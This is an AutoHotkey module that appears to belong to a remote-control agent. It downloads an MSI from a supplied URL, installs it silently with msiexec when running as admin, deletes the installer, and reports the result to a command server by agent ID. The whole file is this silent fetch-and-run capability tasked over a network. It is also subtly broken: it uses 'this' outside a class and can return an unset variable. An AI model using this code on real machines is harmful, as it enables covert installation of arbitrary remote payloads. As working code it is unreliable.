; ============================================================================
; INSTALL MSI MODULE
; ============================================================================
; Downloads and installs an MSI package silently
; Requires administrative privileges
; ============================================================================

InstallMSI(url := "", downloadPath := "", installDir := "") {

    ; Set defaults if not provided
    if (downloadPath = "")
        downloadPath := A_Temp "\installer.msi"
    if (installDir = "")
        installDir := A_AppData "\InstalledApp"

    if A_IsAdmin {
        ; Create installation directory if it doesn't exist
        if !DirExist(installDir)
            DirCreate(installDir)

        ; Download the installer
        Download(url, downloadPath)

        ; Run installer with user-level installation parameters
        installCmd := 'msiexec.exe /i "' downloadPath '" /qn'
            . ' ALLUSERS=""'
            . ' MSIINSTALLPERUSER=1'
            . ' INSTALLDIR="' installDir '"'

        result := RunWait(installCmd)

        ; Clean up
        FileDelete(downloadPath)

        message := Format("command_output|{}|{}", this.agentID, result)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    } else {
        message := Format("command_output|{}|The agent must be running as Admin for this module", this.agentID)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
    return result
}
